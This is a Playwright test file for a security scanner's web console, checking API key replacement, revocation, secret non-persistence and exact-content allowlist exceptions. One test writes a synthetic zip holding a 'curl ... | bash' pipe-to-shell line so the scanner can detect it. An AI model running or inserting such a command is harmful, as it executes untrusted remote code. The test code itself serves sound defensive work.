import { test, expect, type Page } from "@playwright/test";
import { startOidcFixture } from "./oidcFixture";
import { mkdirSync } from "node:fs";
import { resolve } from "node:path";
test.use({ ignoreHTTPSErrors: true });
let fixture: Awaited<ReturnType<typeof startOidcFixture>>;
test.beforeAll(async () => {
  fixture = await startOidcFixture({ keyReplacement: true });
});
test.afterAll(async () => {
  await fixture.stop();
});
async function open(
  page: Page,
  path = "/api-keys?key=d3-key",
  origin = fixture.origin,
) {
  await page.addInitScript(() => localStorage.setItem("aag-lang", "en"));
  await page.goto(origin + path);
  await page.getByRole("link", { name: /SSO/ }).click();
  await expect(page.locator("main")).toBeVisible();
}
async function seed(
  page: Page,
  name: string,
  scopes = ["scan:read"],
  origin = fixture.origin,
) {
  const response = await page.request.post(origin + "/api/api-keys", {
    headers: { Origin: origin, "X-AAG-Account": "a1-alice" },
    data: { name, scopes, days: 7 },
  });
  expect(response.status()).toBe(201);
  return response.json();
}
async function readWith(page: Page, token: string, origin = fixture.origin) {
  return page.request.get(origin + "/api/scans", {
    headers: { Authorization: "Bearer " + token },
  });
}
async function capture(page: Page, name: string) {
  if (process.env.AAG_CAPTURE_EVIDENCE !== "1") return;
  // Never capture a raw token, including synthetic generated tokens.
  await expect(page.locator(".secret-row")).toHaveCount(0);
  if (
    (page.viewportSize()?.width || 1440) <= 800 &&
    (await page.locator(".sidebar").getAttribute("class"))
      ?.split(" ")
      .includes("open")
  ) {
    await page.getByRole("button", { name: /^(Menu|메뉴)$/ }).click();
  }
  await expect
    .poll(() =>
      page.evaluate(() => {
        const sidebar = document.querySelector(".sidebar")!;
        return innerWidth > 800 || sidebar.getBoundingClientRect().right <= 0;
      }),
    )
    .toBe(true);
  await page.evaluate(async () => {
    await document.fonts.ready;
    window.scrollTo(0, 0);
    (document.activeElement as HTMLElement)?.blur();
  });
  const directory = resolve(
    import.meta.dirname,
    "../../docs/engineering/screenshots/convenience-d3",
  );
  mkdirSync(directory, { recursive: true });
  await page.screenshot({
    path: resolve(directory, name + ".png"),
    fullPage: true,
  });
}
test("test_replacement_keeps_old_key_active", async ({ page }) => {
  await open(page);
  const old = await seed(page, "Replacement read-only");
  await page.goto(fixture.origin + "/api-keys?key=" + old.id);
  const card = page.locator('article[aria-current="true"]').filter({
    has: page.getByRole("heading", {
      name: "Replacement read-only",
      exact: true,
    }),
  });
  await page
    .getByRole("combobox", { name: "Expires in", exact: true })
    .selectOption("7");
  await card.getByRole("button", { name: "Prepare replacement key" }).click();
  await expect(page.getByLabel("Name", { exact: true })).toHaveValue(
    "Replacement read-only",
  );
  await expect(
    page.getByRole("combobox", { name: "Scope", exact: true }),
  ).toHaveValue("read");
  await expect(
    page.getByRole("combobox", { name: "Expires in", exact: true }),
  ).toHaveValue("7");
  await capture(page, "replacement-before-desktop-dark");
  await page.getByRole("button", { name: "Create key", exact: true }).click();
  await expect(page.locator(".secret-row code")).toBeVisible();
  const token = await page.locator(".secret-row code").innerText();
  expect((await readWith(page, old.token)).status()).toBe(200);
  expect((await readWith(page, token)).status()).toBe(200);
  const management = await page.request.get(fixture.origin + "/api/api-keys", {
    headers: { Authorization: "Bearer " + token },
  });
  expect(management.status()).toBe(403);
  const write = await page.request.post(fixture.origin + "/api/scans", {
    headers: { Authorization: "Bearer " + token },
    data: { url: "https://github.com/example/synthetic", profile: "static" },
  });
  expect(write.status()).toBe(403);
  await page.getByRole("button", { name: "Saved · dismiss" }).click();
  await expect(
    page.getByText(
      "Update your tool with the new key, then revoke the previous key separately.",
    ),
  ).toBeVisible();
  await expect(
    card.getByRole("button", { name: "Revoke", exact: true }),
  ).toBeVisible();
  await capture(page, "replacement-after-desktop-dark");
  await page.evaluate(() => (document.documentElement.dataset.theme = "light"));
  await capture(page, "replacement-after-desktop-light");
  await page.setViewportSize({ width: 390, height: 844 });
  await capture(page, "replacement-after-mobile-light");
});
test("test_new_key_shown_once_not_in_storage", async ({ page }) => {
  await open(page);
  await page
    .locator('article[aria-current="true"]')
    .getByRole("button", { name: "Prepare replacement key" })
    .click();
  await page.getByRole("button", { name: "Create key", exact: true }).click();
  const secret = await page.locator(".secret-row code").innerText();
  expect(secret.startsWith("aag_sk_")).toBe(true);
  const browserData = await page.evaluate(() =>
    JSON.stringify({
      local: { ...localStorage },
      session: { ...sessionStorage },
      url: location.href,
      state: history.state,
    }),
  );
  expect(browserData.includes(secret)).toBe(false);
  await page.getByRole("button", { name: "Saved · dismiss" }).click();
  await expect(page.getByText(secret, { exact: true })).toHaveCount(0);
  await page.reload();
  await expect(page.locator(".secret-row")).toHaveCount(0);
  const audit = await page.request.get(fixture.origin + "/api/admin/audit");
  expect(JSON.stringify(await audit.json()).includes(secret)).toBe(false);
});
test("test_issuance_disabled_not_bypassed", async ({ page }) => {
  await open(page);
  // Current server config can change after the page was opened.
  await page.route("**/api/auth/config", async (route) => {
    const response = await route.fetch();
    const config = await response.json();
    await route.fulfill({
      response,
      json: { ...config, api_keys_state: "disabled" },
    });
  });
  await page
    .locator('article[aria-current="true"]')
    .getByRole("button", { name: "Prepare replacement key" })
    .click();
  await expect(page.getByLabel("Name", { exact: true })).toHaveValue("");
  await expect(
    page.getByText("API keys and tool connections are disabled.", {
      exact: false,
    }),
  ).toBeVisible();
  await expect(
    page.getByRole("button", { name: "Create key", exact: true }),
  ).toBeDisabled();
  await capture(page, "issuance-disabled");
});
test("test_old_key_revocation_requires_reason", async ({ page }) => {
  await open(page);
  const old = await seed(page, "Revoke after rollout");
  await page.goto(fixture.origin + "/api-keys?key=" + old.id);
  const card = page.locator('article[aria-current="true"]').filter({
    has: page.getByRole("heading", {
      name: "Revoke after rollout",
      exact: true,
    }),
  });
  await card.getByRole("button", { name: "Revoke", exact: true }).click();
  await page.getByRole("button", { name: "Confirm revocation" }).click();
  expect((await readWith(page, old.token)).status()).toBe(200);
  await page
    .getByLabel("Revocation reason")
    .fill("Updated tools and verified new key");
  await capture(page, "revoke-reason-desktop-dark");
  await page.getByRole("button", { name: "Confirm revocation" }).click();
  await expect(
    card.getByRole("button", { name: "Revoke", exact: true }),
  ).toHaveCount(0);
  expect((await readWith(page, old.token)).status()).toBe(401);
});
test("test_exception_changed_hash_not_reused", async ({ page }) => {
  await open(page, "/admin?tab=allowlist&exception=d3-exception");
  const selected = page.locator('[aria-current="true"]');
  await expect(
    selected.getByText("a".repeat(64), { exact: true }),
  ).toBeVisible();
  await expect(
    selected.getByText("c".repeat(64), { exact: true }),
  ).toBeVisible();
  await expect(
    selected.getByRole("link", { name: "Rescan source" }),
  ).toHaveAttribute("href", "/new");
  await capture(page, "exception-original-desktop-dark");
  await selected
    .getByRole("button", { name: "Review a new exception" })
    .click();
  await expect(page.getByLabel("Content SHA256")).toHaveValue("");
  await page
    .getByLabel("Source", { exact: true })
    .fill("synthetic-package.zip");
  await page.getByLabel("Content SHA256").fill("b".repeat(64));
  await page.getByLabel("Finding fingerprint").fill("d".repeat(64));
  await page
    .getByLabel("Expires · within 90 days")
    .fill(new Date(Date.now() + 86400000).toISOString().slice(0, 16));
  await page
    .getByLabel("Reason", { exact: true })
    .fill("Reviewed changed source after a new scan");
  await page
    .getByRole("button", { name: "Create exception", exact: true })
    .click();
  await expect(page.getByLabel("Content SHA256")).toHaveValue("");
  const response = await page.request.get(
    fixture.origin + "/api/admin/allowlist?exception=d3-exception",
  );
  const rules = await response.json();
  expect(
    rules.find((rule: any) => rule.id === "d3-exception").content_hash,
  ).toBe("a".repeat(64));
  expect(
    rules.find((rule: any) => rule.content_hash === "b".repeat(64)).id,
  ).not.toBe("d3-exception");
  await page.setViewportSize({ width: 390, height: 844 });
  await capture(page, "exception-mobile-dark");
});

test("a delayed accepted issuance keeps newer input and settles pending without storing its secret", async ({
  page,
}) => {
  await open(page);
  let release!: () => void;
  const hold = new Promise<void>((done) => (release = done));
  let accepted = false;
  await page.route("**/api/api-keys", async (route) => {
    if (route.request().method() !== "POST") return route.continue();
    const response = await route.fetch();
    expect(response.status()).toBe(201);
    accepted = true;
    await hold;
    await route.fulfill({ response });
  });
  await page.getByLabel("Name", { exact: true }).fill("Delayed issued key");
  await page.getByRole("button", { name: "Create key", exact: true }).click();
  await expect.poll(() => accepted).toBe(true);
  await page.getByLabel("Name", { exact: true }).fill("Newer unsent key name");
  release();
  await expect(page.locator(".secret-row code")).toBeVisible();
  await expect(page.getByLabel("Name", { exact: true })).toHaveValue(
    "Newer unsent key name",
  );
  await expect(
    page.getByRole("heading", { name: "Delayed issued key", exact: true }),
  ).toBeVisible();
  await page.getByRole("button", { name: "Saved · dismiss" }).click();
  await expect(
    page.getByRole("button", { name: "Create key", exact: true }),
  ).toBeEnabled();
});
test("unknown issuance is checked with GET before any explicit second POST", async ({
  page,
}) => {
  await open(page);
  let posts = 0;
  await page.route("**/api/api-keys", async (route) => {
    if (route.request().method() !== "POST") return route.continue();
    posts++;
    const response = await route.fetch();
    expect(response.status()).toBe(201);
    await route.abort("failed");
  });
  await page.getByLabel("Name", { exact: true }).fill("Uncertain issued key");
  await page.getByRole("button", { name: "Create key", exact: true }).click();
  await expect(
    page.getByRole("button", { name: "Check current keys" }),
  ).toBeVisible();
  await expect(
    page.getByRole("button", { name: "Create key", exact: true }),
  ).toBeDisabled();
  await expect(page.getByLabel("Name", { exact: true })).toHaveValue(
    "Uncertain issued key",
  );
  await capture(page, "issuance-unknown-desktop-dark");
  await page.getByRole("button", { name: "Check current keys" }).click();
  await expect(
    page.getByRole("heading", { name: "Uncertain issued key", exact: true }),
  ).toBeVisible();
  await expect(
    page.getByRole("button", { name: "Create key", exact: true }),
  ).toBeEnabled();
  expect(posts).toBe(1);
});
test("account switch and a replaced form reject a late issued token", async ({
  page,
  context,
}) => {
  await open(page);
  let release!: () => void;
  const hold = new Promise<void>((done) => (release = done));
  let accepted = false;
  await page.route("**/api/api-keys", async (route) => {
    if (route.request().method() !== "POST") return route.continue();
    expect(route.request().headers()["x-aag-account"]).toBe("a1-alice");
    const response = await route.fetch();
    expect(response.status()).toBe(201);
    accepted = true;
    await hold;
    await route.fulfill({ response });
  });
  await page.getByLabel("Name", { exact: true }).fill("Alice delayed secret");
  await page.getByRole("button", { name: "Create key", exact: true }).click();
  await expect.poll(() => accepted).toBe(true);
  const other = await context.newPage();
  await context.clearCookies();
  await context.addCookies([
    { name: "oidc_test_account", value: "bob", url: fixture.origin },
  ]);
  await other.goto(fixture.origin + "/api-keys");
  await other.getByRole("link", { name: /SSO/ }).click();
  await expect(
    other.getByRole("button", { name: "Account menu: bob" }),
  ).toBeVisible();
  await expect(
    page.getByRole("button", { name: "Account menu: bob" }),
  ).toBeVisible();
  await page.getByLabel("Name", { exact: true }).fill("Bob unsent key");
  const completed = page.waitForResponse(
    (response) =>
      response.url().endsWith("/api/api-keys") &&
      response.request().method() === "POST",
  );
  release();
  await (await completed).finished();
  await page.evaluate(
    () =>
      new Promise<void>((done) =>
        requestAnimationFrame(() => requestAnimationFrame(() => done())),
      ),
  );
  await expect(page.getByLabel("Name", { exact: true })).toHaveValue(
    "Bob unsent key",
  );
  await expect(page.locator(".secret-row")).toHaveCount(0);
  await expect(
    page.getByRole("heading", { name: "Alice delayed secret" }),
  ).toHaveCount(0);
});
test("exception review preserves authored new scope and manual rescan entry", async ({
  page,
}) => {
  await open(page, "/admin?tab=allowlist&exception=d3-exception");
  await page.getByLabel("Content SHA256").fill("b".repeat(64));
  await page
    .locator('[aria-current="true"]')
    .getByRole("button", { name: "Review a new exception" })
    .click();
  await expect(page.getByLabel("Content SHA256")).toHaveValue("b".repeat(64));
  await page.getByRole("button", { name: "Account menu: alice" }).click();
  await page.getByRole("menuitem", { name: "Display settings" }).hover();
  await page.getByRole("menuitem", { name: "한국어" }).click();
  await expect(
    page
      .locator('[aria-current="true"]')
      .getByText("원래 내용 SHA256", { exact: true }),
  ).toBeVisible();
  await capture(page, "exception-korean-desktop-dark");
  await page.setViewportSize({ width: 390, height: 844 });
  await page.evaluate(() => (document.documentElement.dataset.theme = "light"));
  expect(
    await page
      .locator('[aria-current="true"] > div')
      .evaluate((element) => element.getBoundingClientRect().width),
  ).toBeGreaterThanOrEqual(280);
  await capture(page, "exception-korean-mobile-light");
  await page
    .locator('[aria-current="true"]')
    .getByRole("link", { name: "소스 재검사" })
    .click();
  await expect(page).toHaveURL(fixture.origin + "/new");
  await expect(
    page.getByRole("heading", { name: "새 검사 실행", exact: true }),
  ).toBeVisible();
});

test("server disabled issuance stays blocked even after client controls are altered", async ({
  page,
}) => {
  const disabled = await startOidcFixture({ keyReplacement: "disabled" });
  try {
    await open(page, "/api-keys?key=d3-key", disabled.origin);
    await expect(
      page
        .locator('article[aria-current="true"]')
        .getByRole("button", { name: "Prepare replacement key" }),
    ).toBeDisabled();
    await expect(
      page.getByRole("button", { name: "Create key", exact: true }),
    ).toBeDisabled();
    await capture(page, "issuance-server-disabled");
    await page.evaluate(() => {
      document
        .querySelectorAll("form input, form select, form button")
        .forEach((element) => ((element as HTMLInputElement).disabled = false));
      const name = document.querySelector(
        'input[name="name"]',
      ) as HTMLInputElement;
      name.value = "Attempted bypass";
      name.form!.dispatchEvent(
        new Event("submit", { bubbles: true, cancelable: true }),
      );
    });
    const response = await page.request.post(
      disabled.origin + "/api/api-keys",
      {
        headers: { Origin: disabled.origin, "X-AAG-Account": "a1-alice" },
        data: { name: "Attempted bypass" },
      },
    );
    expect(response.status()).toBe(503);
    const list = await page.request.get(disabled.origin + "/api/api-keys");
    expect((await list.json()).length).toBe(1);
  } finally {
    await disabled.stop();
  }
});
test("a departed same-account form cannot show a late accepted token after return", async ({
  page,
}) => {
  await open(page);
  let release!: () => void;
  const hold = new Promise<void>((done) => (release = done));
  let accepted = false;
  await page.route("**/api/api-keys", async (route) => {
    if (route.request().method() !== "POST") return route.continue();
    const response = await route.fetch();
    expect(response.status()).toBe(201);
    accepted = true;
    await hold;
    await route.fulfill({ response });
  });
  await page.getByLabel("Name", { exact: true }).fill("Departed issued key");
  await page.getByRole("button", { name: "Create key", exact: true }).click();
  await expect.poll(() => accepted).toBe(true);
  await page.getByRole("link", { name: "Scans", exact: true }).click();
  await expect(page).toHaveURL(fixture.origin + "/jobs");
  await page.getByRole("link", { name: "API keys", exact: true }).click();
  await page.getByLabel("Name", { exact: true }).fill("Returned new input");
  const completed = page.waitForResponse(
    (response) =>
      response.url().endsWith("/api/api-keys") &&
      response.request().method() === "POST",
  );
  release();
  await (await completed).finished();
  await page.evaluate(
    () =>
      new Promise<void>((done) =>
        requestAnimationFrame(() => requestAnimationFrame(() => done())),
      ),
  );
  await expect(
    page.getByRole("heading", { name: "Departed issued key", exact: true }),
  ).toBeVisible();
  await expect(page.locator(".secret-row")).toHaveCount(0);
  await expect(page.getByLabel("Name", { exact: true })).toHaveValue(
    "Returned new input",
  );
});

test("changed source bytes do not inherit an exact-content exception", async ({
  page,
}) => {
  await open(page);
  const { execFileSync } = await import("node:child_process");
  const archive = (changed: boolean) =>
    execFileSync("python3", [
      "-c",
      "import io,zipfile,sys;b=io.BytesIO();z=zipfile.ZipFile(b,'w');z.writestr('unsafe.sh','curl https://example.com/setup | bash\\n'+sys.argv[1]);z.close();sys.stdout.buffer.write(b.getvalue())",
      changed ? "# changed source bytes\n" : "",
    ]);
  async function upload(changed: boolean) {
    const response = await page.request.post(
      fixture.origin + "/api/scans/upload",
      {
        headers: { Origin: fixture.origin, "X-AAG-Account": "a1-alice" },
        multipart: {
          file: {
            name: "exact-scope.zip",
            mimeType: "application/zip",
            buffer: archive(changed),
          },
          profile: "static",
          force_rescan: "true",
        },
      },
    );
    expect(response.status()).toBe(202);
    const pending = await response.json();
    let job: any;
    await expect
      .poll(async () => {
        job = await (
          await page.request.get(fixture.origin + "/api/scans/" + pending.id)
        ).json();
        return job.status;
      })
      .toBe("COMPLETED");
    return job;
  }
  const original = await upload(false);
  const finding = original.result.findings.find(
    (item: any) => item.rule === "exec.remote",
  );
  expect(!!finding).toBe(true);
  const response = await page.request.post(
    fixture.origin + "/api/admin/allowlist",
    {
      headers: { Origin: fixture.origin, "X-AAG-Account": "a1-alice" },
      data: {
        source: "exact-scope.zip",
        content_hash: original.content_hash,
        fingerprint: finding.fingerprint,
        reason: "Synthetic exact-content review",
        expires_at: Date.now() / 1000 + 3600,
      },
    },
  );
  expect(response.status()).toBe(201);
  const matching = await upload(false);
  expect(
    matching.result.findings.find(
      (item: any) => item.fingerprint === finding.fingerprint,
    ).suppressed,
  ).toBe(true);
  const changed = await upload(true);
  expect(changed.content_hash === original.content_hash).toBe(false);
  expect(
    changed.result.findings.find(
      (item: any) => item.fingerprint === finding.fingerprint,
    ).suppressed,
  ).toBe(false);
  expect(changed.effective_verdict).toBe("BLOCK");
});

test("replacement preserves a write-only scope without granting read access", async ({
  page,
}) => {
  await open(page);
  const old = await seed(page, "Write-only integration", ["scan:write"]);
  await page.goto(fixture.origin + "/api-keys?key=" + old.id);
  await page
    .locator('article[aria-current="true"]')
    .getByRole("button", { name: "Prepare replacement key" })
    .click();
  await expect(
    page.getByRole("combobox", { name: "Scope", exact: true }),
  ).toHaveValue("write-only");
  await page.getByRole("button", { name: "Create key", exact: true }).click();
  await expect(page.locator(".secret-row code")).toBeVisible();
  const token = await page.locator(".secret-row code").innerText();
  expect((await readWith(page, token)).status()).toBe(403);
  await page.getByRole("button", { name: "Saved · dismiss" }).click();
  const keys = await (
    await page.request.get(fixture.origin + "/api/api-keys")
  ).json();
  const replacement = keys.find(
    (key: any) => key.name === "Write-only integration" && key.id !== old.id,
  );
  expect(replacement.scopes).toEqual(["scan:write"]);
  expect(keys.find((key: any) => key.id === old.id).state).toBe("active");
});

test.describe("Response recovery and accepted mutations", () => {
  let fixture: Awaited<ReturnType<typeof startOidcFixture>>;
  test.beforeAll(async () => {
    fixture = await startOidcFixture({ keyReplacement: true });
  });
  test.afterAll(async () => {
    await fixture.stop();
  });
  for (const [label, body] of [
    ["empty", ""],
    ["truncated", '{"token":'],
  ] as const) {
    test(
      "I1 a committed issuance with " +
        label +
        "201 body requires explicit GET recovery",
      async ({ page }) => {
        await open(page, "/api-keys?key=d3-key", fixture.origin);
        let posts = 0,
          listReads = 0;
        await page.route("**/api/api-keys*", async (route) => {
          if (route.request().method() !== "POST") {
            if (posts) listReads++;
            return route.continue();
          }
          posts++;
          const response = await route.fetch();
          expect(response.status()).toBe(201);
          await route.fulfill({
            status: 201,
            contentType: "application/json",
            body,
          });
        });
        const issuedName = "Incomplete " + label + " issued key";
        await page.getByLabel("Name", { exact: true }).fill(issuedName);
        await page
          .getByRole("button", { name: "Create key", exact: true })
          .click();
        await expect(
          page.getByRole("button", { name: "Check current keys" }),
        ).toBeVisible();
        await expect(page.locator(".secret-row")).toHaveCount(0);
        await expect(page.getByLabel("Name", { exact: true })).toHaveValue(
          issuedName,
        );
        await expect(
          page.getByRole("button", { name: "Create key", exact: true }),
        ).toBeDisabled();
        expect(posts).toBe(1);
        expect(listReads).toBe(0);
        await page.getByRole("button", { name: "Check current keys" }).click();
        await expect(
          page.getByRole("heading", { name: issuedName, exact: true }),
        ).toBeVisible();
        await expect(
          page.getByRole("button", { name: "Create key", exact: true }),
        ).toBeEnabled();
        expect(listReads).toBeGreaterThan(0);
        expect(posts).toBe(1);
      },
    );
  }
  for (const cancel of [false, true]) {
    test(
      "I2 delayed revocation refreshes the key after " +
        (cancel ? "cancellation" : "newer reason"),
      async ({ page }) => {
        await open(page, "/api-keys?key=d3-key", fixture.origin);
        const old = await seed(
          page,
          cancel ? "Delayed cancel revoke" : "Delayed edited revoke",
          ["scan:read"],
          fixture.origin,
        );
        await page.goto(fixture.origin + "/api-keys?key=" + old.id);
        const card = page.locator('article[aria-current="true"]');
        let release!: () => void;
        const hold = new Promise<void>((done) => (release = done));
        let accepted = false;
        await page.route(
          "**/api/api-keys/" + old.id + "/revoke",
          async (route) => {
            const response = await route.fetch();
            expect(response.status()).toBe(200);
            accepted = true;
            await hold;
            await route.fulfill({ response });
          },
        );
        await card.getByRole("button", { name: "Revoke", exact: true }).click();
        await page
          .getByLabel("Revocation reason")
          .fill("Accepted rollout verification reason");
        await page.getByRole("button", { name: "Confirm revocation" }).click();
        await expect.poll(() => accepted).toBe(true);
        if (cancel)
          await page
            .getByRole("button", { name: "Cancel", exact: true })
            .click();
        else
          await page
            .getByLabel("Revocation reason")
            .fill("Newer unsent revocation reason");
        release();
        await expect(card.locator(".badge")).toHaveText("revoked");
        await expect(
          card.getByRole("button", { name: "Revoke", exact: true }),
        ).toHaveCount(0);
        if (cancel)
          await expect(page.getByLabel("Revocation reason")).toHaveCount(0);
        else
          await expect(page.getByLabel("Revocation reason")).toHaveValue(
            "Newer unsent revocation reason",
          );
        await expect(
          page.getByRole("button", { name: "Create key", exact: true }),
        ).toBeEnabled();
        expect((await readWith(page, old.token, fixture.origin)).status()).toBe(
          401,
        );
      },
    );
  }
  test("I2 delayed exception creation refreshes accepted scope while retaining newer input", async ({
    page,
  }) => {
    await open(
      page,
      "/admin?tab=allowlist&exception=d3-exception",
      fixture.origin,
    );
    let release!: () => void;
    const hold = new Promise<void>((done) => (release = done));
    let accepted = false;
    await page.route("**/api/admin/allowlist", async (route) => {
      if (route.request().method() !== "POST") return route.continue();
      const response = await route.fetch();
      expect(response.status()).toBe(201);
      accepted = true;
      await hold;
      await route.fulfill({ response });
    });
    await page
      .getByLabel("Source", { exact: true })
      .fill("Delayed reviewed source.zip");
    await page.getByLabel("Content SHA256").fill("e".repeat(64));
    await page.getByLabel("Finding fingerprint").fill("f".repeat(64));
    await page
      .getByLabel("Expires · within 90 days")
      .fill(new Date(Date.now() + 86400000).toISOString().slice(0, 16));
    await page
      .getByLabel("Reason", { exact: true })
      .fill("Accepted independent exact-scope review");
    await page
      .getByRole("button", { name: "Create exception", exact: true })
      .click();
    await expect.poll(() => accepted).toBe(true);
    await page
      .getByLabel("Source", { exact: true })
      .fill("Newer unsent source.zip");
    await page
      .getByLabel("Reason", { exact: true })
      .fill("Newer unsent exception reason");
    release();
    await expect(
      page.getByRole("heading", {
        name: "Delayed reviewed source.zip",
        exact: true,
      }),
    ).toBeVisible();
    await expect(page.getByLabel("Source", { exact: true })).toHaveValue(
      "Newer unsent source.zip",
    );
    await expect(page.getByLabel("Reason", { exact: true })).toHaveValue(
      "Newer unsent exception reason",
    );
    await expect(
      page.getByRole("button", { name: "Create exception", exact: true }),
    ).toBeEnabled();
  });
});
